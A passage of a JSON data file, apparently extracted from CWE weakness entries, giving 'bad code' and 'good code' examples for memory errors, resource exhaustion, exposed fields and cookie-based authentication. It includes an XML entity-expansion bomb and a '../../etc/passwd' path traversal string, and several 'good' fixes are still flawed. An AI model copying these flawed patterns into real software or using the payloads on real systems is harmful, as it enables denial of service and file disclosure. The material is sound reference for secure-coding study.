string. (bad code) Example Language: C char **ap, *argv[10], *inputstring; for (ap = argv; (*ap = strsep(&inputstring, \" \\\\t\")) != NULL;) \"if (**ap != '\\\\0')\" if (++ap >= &argv[10]) break; /.../ free(ap[4]); Since strsep is not allocating any new memory, freeing an element in the middle of the array is equivalent to free a pointer in the middle of inputstring. Example 3 Consider the following code in the context of a parsing application to extract commands out of user data. The intent is to parse each command and add it to a queue of commands to be executed, discarding each malformed entry. (bad code) Example Language: C //hardcode input length for simplicity char* input = (char*) malloc(40*sizeof(char)); char *tok; char* sep = \" \\\\t\"; get_user_input( input ); /* The following loop will parse and process each token in the input string */ tok = strtok( input, sep); while( NULL != tok ){ if( isMalformed( tok ) ){ /* ignore and discard bad data */ free( tok ); } else{ add_to_command_queue( tok ); } tok = strtok( NULL, sep)); } While the above code attempts to free memory associated with bad commands, since the memory was all allocated in one chunk, it must all be freed together. One way to fix this problem would be to copy the commands into a new memory location before placing them in the queue. Then, after all commands have been processed, the memory can safely be freed. (good code) Example Language: C //hardcode input length for simplicity char* input = (char*) malloc(40*sizeof(char)); char *tok, *command; char* sep = \" \\\\t\"; get_user_input( input ); /* The following loop will parse and process each token in the input string */ tok = strtok( input, sep); while( NULL != tok ){ if( !isMalformed( command ) ){ /* copy and enqueue good data */ command = (char*) malloc( (strlen(tok) + 1) * sizeof(char) ); strcpy( command, tok ); add_to_command_queue( command ); } tok = strtok( NULL, sep)); } free( input )"
    },
    {
        "id": 762,
        "demonstrative_examples": "Example 1 This example allocates a BarObj object using the new operator in C++, however, the programmer then deallocates the object using free(), which may lead to unexpected behavior. (bad code) Example Language: C++ void foo(){ BarObj *ptr = new BarObj() /* do some work with ptr here */ ... free(ptr); } Instead, the programmer should have either created the object with one of the malloc family functions, or else deleted the object with the delete operator. (good code) Example Language: C++ void foo(){ BarObj *ptr = new BarObj() /* do some work with ptr here */ ... delete ptr; } Example 2 In this example, the program does not use matching functions such as malloc/free, new/delete, and new[]/delete[] to allocate/deallocate the resource. (bad code) Example Language: C++ class A { void foo(); }; void A::foo(){ int *ptr; ptr = (int*)malloc(sizeof(int)); delete ptr; } Example 3 In this example, the program calls the delete[] function on non-heap memory. (bad code) Example Language: C++ class A{ void foo(bool); }; void A::foo(bool heap) { int localArray[2] = { 11,22 }; int *p = localArray; if (heap){ p = new int[2]; } delete[] p; }"
    },
    {
        "id": 763,
        "demonstrative_examples": "Example 1 This code attempts to tokenize a string and place it into an array using the strsep function, which inserts a \\\\0 byte in place of whitespace or a tab character. After finishing the loop, each string in the AP array points to a location within the input string. (bad code) Example Language: C char **ap, *argv[10], *inputstring; for (ap = argv; (*ap = strsep(&inputstring, \" \\\\t\")) != NULL;) \"if (**ap != '\\\\0')\" if (++ap >= &argv[10]) break; /.../ free(ap[4]); Since strsep is not allocating any new memory, freeing an element in the middle of the array is equivalent to free a pointer in the middle of inputstring. Example 2 This example allocates a BarObj object using the new operator in C++, however, the programmer then deallocates the object using free(), which may lead to unexpected behavior. (bad code) Example Language: C++ void foo(){ BarObj *ptr = new BarObj() /* do some work with ptr here */ ... free(ptr); } Instead, the programmer should have either created the object with one of the malloc family functions, or else deleted the object with the delete operator. (good code) Example Language: C++ void foo(){ BarObj *ptr = new BarObj() /* do some work with ptr here */ ... delete ptr; } Example 3 In this example, the programmer dynamically allocates a buffer to hold a string and then searches for a specific character. After completing the search, the programmer attempts to release the allocated memory and return SUCCESS or FAILURE to the caller. Note: for simplification, this example uses a hard-coded \"Search Me!\" string and a constant string length of 20. (bad code) Example Language: C #define SUCCESS (1) #define FAILURE (0) int contains_char(char c){ char *str; str = (char*)malloc(20*sizeof(char)); strcpy(str, \"Search Me!\"); while( *str != NULL){ if( *str == c ){ /* matched char, free string and return success */ free(str); return SUCCESS; } \"/* didn't match yet, increment pointer and try next char */\" str = str + 1; } /* we did not match the char in the string, free mem and return failure */ free(str); return FAILURE; } However, if the character is not at the beginning of the string, or if it is not in the string at all, then the pointer will not be at the start of the buffer when the programmer frees it. Instead of freeing the pointer in the middle of the buffer, the programmer can use an indexing pointer to step through the memory or abstract the memory calculations by using array indexing. (good code) Example Language: C #define SUCCESS (1) #define FAILURE (0) int cointains_char(char c){ char *str; int i = 0; str = (char*)malloc(20*sizeof(char)); strcpy(str, \"Search Me!\"); while( i < strlen(str) ){ if( str[i] == c ){ /* matched char, free string and return success */ free(str); return SUCCESS; } \"/* didn't match yet, increment pointer and try next char */\" i = i + 1; } /* we did not match the char in the string, free mem and return failure */ free(str); return FAILURE; } Example 4 Consider the following code in the context of a parsing application to extract commands out of user data. The intent is to parse each command and add it to a queue of commands to be executed, discarding each malformed entry. (bad code) Example Language: C //hardcode input length for simplicity char* input = (char*) malloc(40*sizeof(char)); char *tok; char* sep = \" \\\\t\"; get_user_input( input ); /* The following loop will parse and process each token in the input string */ tok = strtok( input, sep); while( NULL != tok ){ if( isMalformed( tok ) ){ /* ignore and discard bad data */ free( tok ); } else{ add_to_command_queue( tok ); } tok = strtok( NULL, sep)); } While the above code attempts to free memory associated with bad commands, since the memory was all allocated in one chunk, it must all be freed together. One way to fix this problem would be to copy the commands into a new memory location before placing them in the queue. Then, after all commands have been processed, the memory can safely be freed. (good code) Example Language: C //hardcode input length for simplicity char* input = (char*) malloc(40*sizeof(char)); char *tok, *command; char* sep = \" \\\\t\"; get_user_input( input ); /* The following loop will parse and process each token in the input string */ tok = strtok( input, sep); while( NULL != tok ){ if( !isMalformed( command ) ){ /* copy and enqueue good data */ command = (char*) malloc( (strlen(tok) + 1) * sizeof(char) ); strcpy( command, tok ); add_to_command_queue( command ); } tok = strtok( NULL, sep)); } free( input )"
    },
    {
        "id": 764,
        "demonstrative_examples": ""
    },
    {
        "id": 765,
        "demonstrative_examples": ""
    },
    {
        "id": 766,
        "demonstrative_examples": "Example 1 The following example declares a critical variable public, making it accessible to anyone with access to the object in which it is contained. (bad code) Example Language: C++ public: char* password; Instead, the critical data should be declared private. (good code) Example Language: C++ private: char* password; Even though this example declares the password to be private, there are other possible issues with this implementation, such as the possibility of recovering the password from process memory ( CWE-257 ). Example 2 The following example shows a basic user account class that includes member variables for the username and password as well as a public constructor for the class and a public method to authorize access to the user account. (bad code) Example Language: C++ #define MAX_PASSWORD_LENGTH 15 #define MAX_USERNAME_LENGTH 15 class UserAccount { public: UserAccount(char *username, char *password) { if ((strlen(username) > MAX_USERNAME_LENGTH) || (strlen(password) > MAX_PASSWORD_LENGTH)) { ExitError(\"Invalid username or password\"); } strcpy(this->username, username); strcpy(this->password, password); } int authorizeAccess(char *username, char *password) { if ((strlen(username) > MAX_USERNAME_LENGTH) || (strlen(password) > MAX_PASSWORD_LENGTH)) { ExitError(\"Invalid username or password\"); } // if the username and password in the input parameters are equal to // the username and password of this account class then authorize access if (strcmp(this->username, username) || strcmp(this->password, password)) return 0; // otherwise do not authorize access else return 1; } char username[MAX_USERNAME_LENGTH+1]; char password[MAX_PASSWORD_LENGTH+1]; }; However, the member variables username and password are declared public and therefore will allow access and changes to the member variables to anyone with access to the object. These member variables should be declared private as shown below to prevent unauthorized access and changes. (good code) Example Language: C++ class UserAccount { public: ... private: char username[MAX_USERNAME_LENGTH+1]; char password[MAX_PASSWORD_LENGTH+1]; };"
    },
    {
        "id": 767,
        "demonstrative_examples": "Example 1 The following example declares a critical variable to be private, and then allows the variable to be modified by public methods. (bad code) Example Language: C++ private: float price; public: void changePrice(float newPrice) { price = newPrice; } Example 2 The following example could be used to implement a user forum where a single user (UID) can switch between multiple profiles (PID). (bad code) Example Language: Java public class Client { private int UID; public int PID; private String userName; public Client(String userName){ PID = getDefaultProfileID(); UID = mapUserNametoUID( userName ); this.userName = userName; } public void setPID(int ID) { UID = ID; } } The programmer implemented setPID with the intention of modifying the PID variable, but due to a typo. accidentally specified the critical variable UID instead. If the program allows profile IDs to be between 1 and 10, but a UID of 1 means the user is treated as an admin, then a user could gain administrative privileges as a result of this typo."
    },
    {
        "id": 768,
        "demonstrative_examples": "Example 1 The following function attempts to take a size value from a user and allocate an array of that size (we ignore bounds checking for simplicity). The function tries to initialize each spot with the value of its index, that is, A[len-1] = len - 1; A[len-2] = len - 2; ... A[1] = 1; A[0] = 0; However, since the programmer uses the prefix decrement operator, when the conditional is evaluated with i == 1, the decrement will result in a 0 value for the first part of the predicate, causing the second portion to be bypassed via short-circuit evaluation. This means we cannot be sure of what value will be in A[0] when we return the array to the user. (bad code) Example Language: C #define PRIV_ADMIN 0 #define PRIV_REGULAR 1 typedef struct{ int privileges; int id; } user_t; user_t *Add_Regular_Users(int num_users){ user_t* users = (user_t*)calloc(num_users, sizeof(user_t)); int i = num_users; while( --i && (users[i].privileges = PRIV_REGULAR) ){ users[i].id = i; } return users; } int main(){ user_t* test; int i; test = Add_Regular_Users(25); for(i = 0; i < 25; i++) printf(\"user %d has privilege level %d\\\\n\", test[i].id, test[i].privileges); } \"When compiled and run, the above code will output a privilege level of 1, or PRIV_REGULAR for every user but the user with id 0 since the prefix increment operator used in the if statement will reach zero and short circuit before setting the 0th user's privilege level. Since we used calloc, this privilege will be set to 0, or PRIV_ADMIN.\""
    },
    {
        "id": 770,
        "demonstrative_examples": "Example 1 This code allocates a socket and forks each time it receives a new connection. (bad code) Example Language: C sock=socket(AF_INET, SOCK_STREAM, 0); while (1) { newsock=accept(sock, ...); printf(\"A connection has been accepted\\\\n\"); pid = fork(); } The program does not track how many connections have been made, and it does not limit the number of connections. Because forking is a relatively expensive operation, an attacker would be able to cause the system to run out of CPU, processes, or memory by making a large number of connections. Alternatively, an attacker could consume all available connections, preventing others from accessing the system remotely. Example 2 In the following example a server socket connection is used to accept a request to store data on the local file system using a specified filename. The method openSocketConnection establishes a server socket to accept requests from a client. When a client establishes a connection to this service the getNextMessage method is first used to retrieve from the socket the name of the file to store the data, the openFileToWrite method will validate the filename and open a file to write to on the local file system. The getNextMessage is then used within a while loop to continuously read data from the socket and output the data to the file until there is no longer any data from the socket. (bad code) Example Language: C int writeDataFromSocketToFile(char *host, int port) { char filename[FILENAME_SIZE]; char buffer[BUFFER_SIZE]; int socket = openSocketConnection(host, port); if (socket < 0) { printf(\"Unable to open socket connection\"); return(FAIL); } if (getNextMessage(socket, filename, FILENAME_SIZE) > 0) { if (openFileToWrite(filename) > 0) { while (getNextMessage(socket, buffer, BUFFER_SIZE) > 0){ if (!(writeToFile(buffer) > 0)) break; } } closeFile(); } closeSocket(socket); } \"This example creates a situation where data can be dumped to a file on the local file system without any limits on the size of the file. This could potentially exhaust file or disk resources and/or limit other clients' ability to access the service.\" Example 3 In the following example, the processMessage method receives a two dimensional character array containing the message to be processed. The two-dimensional character array contains the length of the message in the first character array and the message body in the second character array. The getMessageLength method retrieves the integer value of the length from the first character array. After validating that the message length is greater than zero, the body character array pointer points to the start of the second character array of the two-dimensional character array and memory is allocated for the new body character array. (bad code) Example Language: C /* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */ int processMessage(char **message) { char *body; int length = getMessageLength(message[0]); if (length > 0) { body = &message[1][0]; processMessageBody(body); return(SUCCESS); } else { printf(\"Unable to process message; invalid message length\"); return(FAIL); } } This example creates a situation where the length of the body character array can be very large and will consume excessive memory, exhausting system resources. This can be avoided by restricting the length of the second character array with a maximum length check \"Also, consider changing the type from 'int' to 'unsigned int', so that you are always guaranteed that the number is positive. This might not be possible if the protocol specifically requires allowing negative values, or if you cannot control the return value from getMessageLength(), but it could simplify the check to ensure the input is positive, and eliminate other errors such as signed-to-unsigned conversion errors (\" CWE-195 ) that may occur elsewhere in the code. (good code) Example Language: C unsigned int length = getMessageLength(message[0]); if ((length > 0) && (length < MAX_LENGTH)) {...} Example 4 In the following example, a server object creates a server socket and accepts client connections to the socket. For every client connection to the socket a separate thread object is generated using the ClientSocketThread class that handles request made by the client through the socket. (bad code) Example Language: Java public void acceptConnections() { try { ServerSocket serverSocket = new ServerSocket(SERVER_PORT); int counter = 0; boolean hasConnections = true; while (hasConnections) { Socket client = serverSocket.accept(); Thread t = new Thread(new ClientSocketThread(client)); t.setName(client.getInetAddress().getHostName() + \":\" + counter++); t.start(); } serverSocket.close(); } catch (IOException ex) {...} } In this example there is no limit to the number of client connections and client threads that are created. Allowing an unlimited number of client connections and threads could potentially overwhelm the system and system resources. The server should limit the number of client connections and the client threads that are created. This can be easily done by creating a thread pool object that limits the number of threads that are generated. (good code) Example Language: Java public static final int SERVER_PORT = 4444; public static final int MAX_CONNECTIONS = 10; ... public void acceptConnections() { try { ServerSocket serverSocket = new ServerSocket(SERVER_PORT); int counter = 0; boolean hasConnections = true; while (hasConnections) { hasConnections = checkForMoreConnections(); Socket client = serverSocket.accept(); Thread t = new Thread(new ClientSocketThread(client)); t.setName(client.getInetAddress().getHostName() + \":\" + counter++); ExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS); pool.execute(t); } serverSocket.close(); } catch (IOException ex) {...} } Example 5 An unnamed web site allowed a user to purchase tickets for an event. A menu option allowed the user to purchase up to 10 tickets, but the back end did not restrict the actual number of tickets that could be purchased. Example 5 References: [REF-667] Rafal Los. \"Real-Life Example of a \\'Business Logic Defect\\' (Screen Shots!)\". 2011. \\n\\t\\t\\t\\t< http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581 >. Example 6 Here the problem is that every time a connection is made, more memory is allocated. So if one just opened up more and more connections, eventually the machine would run out of memory. (bad code) Example Language: C bar connection() { foo = malloc(1024); return foo; } endConnection(bar foo) { free(foo); } int main() { while(1) { foo=connection(); } endConnection(foo) }"
    },
    {
        "id": 771,
        "demonstrative_examples": ""
    },
    {
        "id": 772,
        "demonstrative_examples": "Example 1 The following method never closes the new file handle. Given enough time, the Finalize() method for BufferReader should eventually call Close(), but there is no guarantee as to how long this action will take. In fact, there is no guarantee that Finalize() will ever be invoked. In a busy environment, the Operating System could use up all of the available file handles before the Close() function is called. (bad code) Example Language: Java private void processFile(string fName) { BufferReader fil = new BufferReader(new FileReader(fName)); String line; while ((line = fil.ReadLine()) != null) { processLine(line); } } The good code example simply adds an explicit call to the Close() function when the system is done using the file. Within a simple example such as this the problem is easy to see and fix. In a real system, the problem may be considerably more obscure. (good code) Example Language: Java private void processFile(string fName) { BufferReader fil = new BufferReader(new FileReader(fName)); String line; while ((line = fil.ReadLine()) != null) { processLine(line); } fil.Close(); } Example 2 The following code attempts to open a new connection to a database, process the results returned by the database, and close the allocated SqlConnection object. (bad code) Example Language: C# SqlConnection conn = new SqlConnection(connString); SqlCommand cmd = new SqlCommand(queryString); cmd.Connection = conn; conn.Open(); SqlDataReader rdr = cmd.ExecuteReader(); HarvestResults(rdr); conn.Connection.Close(); The problem with the above code is that if an exception occurs while executing the SQL or processing the results, the SqlConnection object is not closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries. Example 3 This code attempts to open a connection to a database and catches any exceptions that may occur. (bad code) Example Language: Java try { Connection con = DriverManager.getConnection(some_connection_string); } catch ( Exception e ) { log( e ); } If an exception occurs after establishing the database connection and before the same connection closes, the pool of database connections may become exhausted. If the number of available connections is exceeded, other users cannot access this resource, effectively denying access to the application. Example 4 Under normal conditions the following C# code executes a database query, processes the results returned by the database, and closes the allocated SqlConnection object. But if an exception occurs while executing the SQL or processing the results, the SqlConnection object is not closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries. (bad code) Example Language: C# ... SqlConnection conn = new SqlConnection(connString); SqlCommand cmd = new SqlCommand(queryString); cmd.Connection = conn; conn.Open(); SqlDataReader rdr = cmd.ExecuteReader(); HarvestResults(rdr); conn.Connection.Close(); ... Example 5 The following C function does not close the file handle it opens if an error occurs. If the process is long-lived, the process can run out of file handles. (bad code) Example Language: C int decodeFile(char* fName) { char buf[BUF_SZ]; FILE* f = fopen(fName, \"r\"); if (!f) { printf(\"cannot open %s\\\\n\", fName); return DECODE_FAIL; } else { while (fgets(buf, BUF_SZ, f)) { if (!checkChecksum(buf)) { return DECODE_FAIL; } else { decodeBlock(buf); } } } fclose(f); return DECODE_SUCCESS; }"
    },
    {
        "id": 773,
        "demonstrative_examples": ""
    },
    {
        "id": 774,
        "demonstrative_examples": ""
    },
    {
        "id": 775,
        "demonstrative_examples": ""
    },
    {
        "id": 776,
        "demonstrative_examples": "Example 1 The DTD and the very brief XML below illustrate what is meant by an XML bomb. The ZERO entity contains one character, the letter A. The choice of entity name ZERO is being used to indicate length equivalent to that exponent on two, that is, the length of ZERO is 2^0. Similarly, ONE refers to ZERO twice, therefore the XML parser will expand ONE to a length of 2, or 2^1. Ultimately, we reach entity THIRTYTWO, which will expand to 2^32 characters in length, or 4 GB, probably consuming far more data than expected. (attack code) Example Language: XML <?xml version=\"1.0\"?> <!DOCTYPE MaliciousDTD [ <!ENTITY ZERO \"A\"> <!ENTITY ONE \"&ZERO;&ZERO;\"> <!ENTITY TWO \"&ONE;&ONE;\"> ... <!ENTITY THIRTYTWO \"&THIRTYONE;&THIRTYONE;\"> ]> <data>&THIRTYTWO;</data>"
    },
    {
        "id": 777,
        "demonstrative_examples": "Example 1 Consider a web application that supports multiple languages. It selects messages for an appropriate language by using the lang parameter. (bad code) Example Language: PHP $dir = \"/home/cwe/languages\"; \"$lang = $_GET['lang'];\" if (preg_match(\"/[A-Za-z0-9]+/\", $lang)) { include(\"$dir/$lang\"); } else { echo \"You shall not pass!\\\\n\"; } The previous code attempts to match only alphanumeric values so that language values such as \"english\" and \"french\" are valid while also protecting against path traversal, CWE-22 . However, the regular expression anchors are omitted, so any text containing at least one alphanumeric character will now pass the validation step. For example, the attack string below will match the regular expression. (attack code) ../../etc/passwd \"If the attacker can inject code sequences into a file, such as the web server's HTTP request log, then the attacker may be able to redirect the lang parameter to the log file and execute arbitrary code.\""
    },
    {
        "id": 778,
        "demonstrative_examples": "Example 1 The example below shows a configuration for the service security audit feature in the Windows Communication Foundation (WCF). (bad code) Example Language: XML <system.serviceModel> <behaviors> <serviceBehaviors> <behavior name=\"NewBehavior\"> <serviceSecurityAudit auditLogLocation=\"Default\" suppressAuditFailure=\"false\" serviceAuthorizationAuditLevel=\"None\" messageAuthenticationAuditLevel=\"None\" /> ... </system.serviceModel> The previous configuration file has effectively disabled the recording of security-critical events, which would force the administrator to look to other sources during debug or recovery efforts. Logging failed authentication attempts can warn administrators of potential brute force attacks. Similarly, logging successful authentication events can provide a useful audit trail when a legitimate account is compromised. The following configuration shows appropriate settings, assuming that the site does not have excessive traffic, which could fill the logs if there are a large number of success or failure events ( CWE-779 ). (good code) Example Language: XML <system.serviceModel> <behaviors> <serviceBehaviors> <behavior name=\"NewBehavior\"> <serviceSecurityAudit auditLogLocation=\"Default\" suppressAuditFailure=\"false\" serviceAuthorizationAuditLevel=\"SuccessAndFailure\" messageAuthenticationAuditLevel=\"SuccessAndFailure\" /> ... </system.serviceModel>"
    },
    {
        "id": 779,
        "demonstrative_examples": ""
    },
    {
        "id": 780,
        "demonstrative_examples": "Example 1 The example below attempts to build an RSA cipher. (bad code) Example Language: Java public Cipher getRSACipher() { Cipher rsa = null; try { rsa = javax.crypto.Cipher.getInstance(\"RSA/NONE/NoPadding\"); } catch (java.security.NoSuchAlgorithmException e) { log(\"this should never happen\", e); } catch (javax.crypto.NoSuchPaddingException e) { log(\"this should never happen\", e); } return rsa; } While the previous code successfully creates an RSA cipher, the cipher does not use padding. The following code creates an RSA cipher using OAEP. (good code) Example Language: Java public Cipher getRSACipher() { Cipher rsa = null; try { rsa = javax.crypto.Cipher.getInstance(\"RSA/ECB/OAEPWithMD5AndMGF1Padding\"); } catch (java.security.NoSuchAlgorithmException e) { log(\"this should never happen\", e); } catch (javax.crypto.NoSuchPaddingException e) { log(\"this should never happen\", e); } return rsa; }"
    },
    {
        "id": 781,
        "demonstrative_examples": ""
    },
    {
        "id": 782,
        "demonstrative_examples": ""
    },
    {
        "id": 783,
        "demonstrative_examples": "Example 1 In the following example, the method validateUser makes a call to another method to authenticate a username and password for a user and returns a success or failure code. (bad code) Example Language: C #define FAIL 0 #define SUCCESS 1 ... int validateUser(char *username, char *password) { int isUser = FAIL; // call method to authenticate username and password // if authentication fails then return failure otherwise return success if (isUser = AuthenticateUser(username, password) == FAIL) { return isUser; } else { isUser = SUCCESS; } return isUser; } However, the method that authenticates the username and password is called within an if statement with incorrect operator precedence logic. Because the comparison operator \"==\" has a higher precedence than the assignment operator \"=\", the comparison operator will be evaluated first and if the method returns FAIL then the comparison will be true, the return variable will be set to true and SUCCESS will be returned. This operator precedence logic error can be easily resolved by properly using parentheses within the expression of the if statement, as shown below. (good code) Example Language: C ... if ((isUser = AuthenticateUser(username, password)) == FAIL) { ... Example 2 In this example, the method calculates the return on investment for an accounting/financial application. The return on investment is calculated by subtracting the initial investment costs from the current value and then dividing by the initial investment costs. (bad code) Example Language: Java public double calculateReturnOnInvestment(double currentValue, double initialInvestment) { double returnROI = 0.0; // calculate return on investment returnROI = currentValue - initialInvestment / initialInvestment; return returnROI; } However, the return on investment calculation will not produce correct results because of the incorrect operator precedence logic in the equation. The divide operator has a higher precedence than the minus operator, therefore the equation will divide the initial investment costs by the initial investment costs which will only subtract one from the current value. Again this operator precedence logic error can be resolved by the correct use of parentheses within the equation, as shown below. (good code) Example Language: Java ... returnROI = (currentValue - initialInvestment) / initialInvestment; ... Note that the initialInvestment variable in this example should be validated to ensure that it is greater than zero to avoid a potential divide by zero error ( CWE-369 )."
    },
    {
        "id": 784,
        "demonstrative_examples": "Example 1 The following code excerpt reads a value from a browser cookie to determine the role of the user. (bad code) Example Language: Java Cookie[] cookies = request.getCookies(); for (int i =0; i< cookies.length; i++) { Cookie c = cookies[i]; if (c.getName().equals(\"role\")) { userRole = c.getValue(); } } Example 2 The following code could be for a medical records application. It performs authentication by checking if a cookie has been set. (bad code) Example Language: PHP \"$auth = $_COOKIES['authenticated'];\" if (! $auth) { if (AuthenticateUser($_POST[\\'user\\'], $_POST[\\'password\\']) == \"success\") { // save the cookie to send out in future responses setcookie(\"authenticated\", \"1\", time()+60*60*2); } else { ShowLoginScreen(); die(\"\\\\n\"); } } \"DisplayMedicalHistory($_POST['patient_ID']);\" The programmer expects that the AuthenticateUser() check will always be applied, and the \"authenticated\" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can set the \"authenticated\" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication. Example 3 In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data. (bad code) Example Language: Java Cookie[] cookies = request.getCookies(); for (int i =0; i< cookies.length; i++) { Cookie c = cookies[i]; if (c.getName().equals(\"authenticated\") && Boolean.TRUE.equals(c.getValue())) { authenticated = true; } }"
    },
    {
        "id": 785,
        "demonstrative_examples": "Example 1 In this example the function creates a directory named \"output\\\\<name>\" in the current directory and returns a heap-allocated copy of its name. (bad code) Example Language: C char *createOutputDirectory(char *name) { char outputDirectoryName[128]; if (getCurrentDirectory(128, outputDirectoryName) == 0) { return null; } if (!PathAppend(outputDirectoryName, \"output\")) { return null; } if (!PathAppend(outputDirectoryName, name)) { return null; } if (SHCreateDirectoryEx(NULL, outputDirectoryName, NULL) != ERROR_SUCCESS) { return null; } return StrDup(outputDirectoryName); } For most values of the current directory and the name parameter, this function will work properly. However, if the name parameter is particularly long, then the second call to PathAppend() could overflow the outputDirectoryName buffer, which is smaller than MAX_PATH bytes."
    },
    {
        "id": 786,
        "demonstrative_examples": "Example 1 In the following C/C++ example, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character. (bad code) Example Language: C char* trimTrailingWhitespace(char *strMessage, int length) { char *retMessage; char *message = malloc(sizeof(char)*(length+1)); // copy input string to a temporary string char message[length+1]; int index; for (index = 0; index < length; index++) { message[index] = strMessage[index]; } \"message[index] = '\\\\0';\" // trim trailing whitespace int len = index-1; while (isspace(message[len])) { \"message[len] = '\\\\0';\" len--; } // return string without trailing whitespace retMessage = message; return retMessage; } However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer. Example 2 The following example asks a user for an offset into an array to select an item. (bad code) Example Language: C int main (int argc, char **argv) { char *items[] = {\"boat\", \"car\", \"truck\", \"train\"}; int index = GetUntrustedOffset(); printf(\"You selected %s\\\\n\", items[index-1]); } The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read ( CWE-126 ). Example 3 The following is an example of code that may result in a buffer underwrite, if find() returns a negative value to indicate that ch is not found in srcBuf: (bad code) Example Language: C int main() { ... strncpy(destBuf, &srcBuf[find(srcBuf, ch)], 1024); ... } If the index to srcBuf is somehow under user control, this is an arbitrary write-what-where condition."
    },
    {
        "id": 787,
        "demonstrative_examples": "Example 1 The following code attempts to save four different identification numbers into an array. (bad code) Example Language: C int id_sequence[3]; /* Populate the id array. */ id_sequence[0] = 123; id_sequence[1] = 234; id_sequence[2] = 345; id_sequence[3] = 456; Since the array is only allocated to hold three elements, the valid indices are 0 to 2; so, the assignment to id_sequence[3] is out of bounds. Example 2 In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed: (bad code) Example Language: C int returnChunkSize(void *) { /* if chunk info is valid, return the size of usable memory, * else, return -1 to indicate an error */ ... } int main() { ... memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1)); ... } If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation ( CWE-252 ), so -1 can be passed as the size argument to memcpy() ( CWE-805 ). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 ( CWE-195 ), and therefore will copy far more memory than is likely available to the destination buffer ( CWE-787 , CWE-788 ). Example 3 This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer. (bad code) Example Language: C void host_lookup(char *user_supplied_addr){ struct hostent *hp; in_addr_t *addr; char hostname[64]; in_addr_t inet_addr(const char *cp); /*routine that ensures user_supplied_addr is in the right format for conversion */ validate_addr_form(user_supplied_addr); addr = inet_addr(user_supplied_addr); hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET); strcpy(hostname, hp->h_name); } This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then we may overwrite sensitive data or even relinquish control flow to the attacker. Note that this example also contains an unchecked return value ( CWE-252 ) that can lead to a NULL pointer dereference ( CWE-476 ). Example 4 This example applies an encoding procedure to an input string and stores it into a buffer. (bad code) Example Language: C char * copy_input(char *user_supplied_string){ int i, dst_index; char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE); if ( MAX_SIZE <= strlen(user_supplied_string) ){ die(\"user string too long, die evil hacker!\"); } dst_index = 0; for ( i = 0; i < strlen(user_supplied_string); i++ ){ \"if( '&' == user_supplied_string[i] ){\" \"dst_buf[dst_index++] = '&';\" \"dst_buf[dst_index++] = 'a';\" \"dst_buf[dst_index++] = 'm';\" \"dst_buf[dst_index++] = 'p';\" \"dst_buf[dst_index++] = ';';\" } \"else if ('<' == user_supplied_string[i] ){\" /* encode to &lt; */ } else dst_buf[dst_index++] = user_supplied_string[i]; } return dst_buf; } The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands. Example 5 In the following C/C++ example, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character. (bad code) Example Language: C char* trimTrailingWhitespace(char *strMessage, int length) { char *retMessage; char *message = malloc(sizeof(char)*(length+1)); // copy input string to a temporary string char message[length+1]; int index; for (index = 0; index < length; index++) { message[index] = strMessage[index]; } \"message[index] = '\\\\0';\" // trim trailing whitespace int len = index-1; while (isspace(message[len])) { \"message[len] = '\\\\0';\" len--; } // return string without trailing whitespace retMessage = message; return retMessage; } However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer. Example 6 The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget. (bad code) Example Language: C int i; unsigned int numWidgets; Widget **WidgetList; numWidgets = GetUntrustedSizeValue(); if ((numWidgets == 0) || (numWidgets > MAX_NUM_WIDGETS)) { ExitError(\"Incorrect number of widgets requested!\"); } WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *)); printf(\"WidgetList ptr=%p\\\\n\", WidgetList); for(i=0; i<numWidgets; i++) { WidgetList[i] = InitializeWidget(); } WidgetList[numWidgets] = NULL; showWidgets(WidgetList); However, this code contains an off-by-one calculation error ( CWE-193 ). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be ( CWE-131 ). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write ( CWE-787 ) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption. Example 7 The following is an example of code that may result in a buffer underwrite, if find() returns a negative value to indicate that ch is not found in srcBuf: (bad code) Example Language: C int main() { ... strncpy(destBuf, &srcBuf[find(srcBuf, ch)], 1024); ... } If the index to srcBuf is somehow under user control, this is an arbitrary write-what-where condition."
    },
    {
        "id": 788,
